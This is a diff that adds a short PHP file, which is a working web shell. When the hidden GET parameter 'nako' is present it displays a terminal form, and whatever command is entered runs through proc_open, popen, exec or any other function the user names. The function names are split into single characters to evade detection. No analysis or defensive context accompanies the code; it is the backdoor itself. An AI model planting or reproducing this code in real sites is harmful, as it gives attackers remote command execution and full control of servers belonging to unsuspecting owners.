@@ -1,0 +1,18 @@
+<?php
+if(isset($_GET['nako'])){
+    $f='f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_'.'e'.'x'.'i'.'s'.'t'.'s';
+    echo '<style>.cb{background:#000;color:#0f0;padding:15px;font:13px monospace;border-top:5px solid #f00;z-index:999999}.i{background:#ff0;color:#000;border:1px solid #000;padding:4px;font-weight:bold}pre{background:#000;color:#0f0;padding:10px;border:1px solid #333;overflow:auto;max-height:500px;line-height:1.2}</style>
+    <div id="nb" class="cb"><b>>> ŤĒRMINĂL</b><form method="POST"><input type="text" name="x" class="i" placeholder="Ƒungsi"> <input type="text" name="y" class="i" placeholder="Ṕerintāh" style="width:40%"> <input type="submit" value="ĒXEC" style="background:#0f0;cursor:pointer;border:none;padding:4px 10px;font-weight:bold"></form><pre>';
+    if(isset($_POST['x'],$_POST['y'])){
+        $x=trim($_POST['x']);$y=$_POST['y'];
+        echo "Running: $x\n".str_repeat("-",20)."\n";
+        if($f($x)){
+            if($x=='p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n'){$p=$x($y,[1=>['pipe','w'],2=>['pipe','w']],$h);if(is_resource($p)){echo htmlspecialchars(stream_get_contents($h[1]).stream_get_contents($h[2]));proc_close($p);}}
+            elseif($x=='p'.'o'.'p'.'e'.'n'){$h=$x($y.' 2>&1','r');while(!feof($h))echo htmlspecialchars(fread($h,1024));pclose($h);}
+            elseif($x=='e'.'x'.'e'.'c'){$x($y,$o);echo htmlspecialchars(implode("\n",$o));}
+            else echo htmlspecialchars(@$x($y));
+        }else echo "Ďisāblëd";
+    }
+    echo '</pre></div><script>var b=document.getElementById("nb");if(b){document.body.appendChild(b);}</script>';
+}
+?>
